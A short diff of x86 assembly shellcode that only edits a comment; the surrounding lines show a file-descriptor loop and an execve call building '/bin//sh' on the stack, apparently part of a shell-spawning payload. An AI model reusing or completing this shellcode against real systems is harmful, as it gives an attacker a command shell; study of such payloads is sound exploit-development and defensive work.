@@ -46,7 +46,7 @@ fd:
 	loop fd 
 
 	mov al,0xb		; (EAX) SYS_execve
-	push word[esp+0x1c]	; 0x00 ASCII NUL 'end of string'
+	push word[esp+0x1c]	; 0x00 ASCII NUL 'end of string' and *envp[]
 	push 0x68732f2f		; 0x68 ASCII 'h'; 0x73 ASCII 's'; 0x2f ASCII '/'; 0x2f ASCII '/'
 	push 0x6e69622f		; 0x6e ASCII 'n'; 0x69 ASCII 'i'; 0x62 ASCII 'b'; 0x2f ASCII '/'
 	mov ebx,esp		; (EBX) *pathname
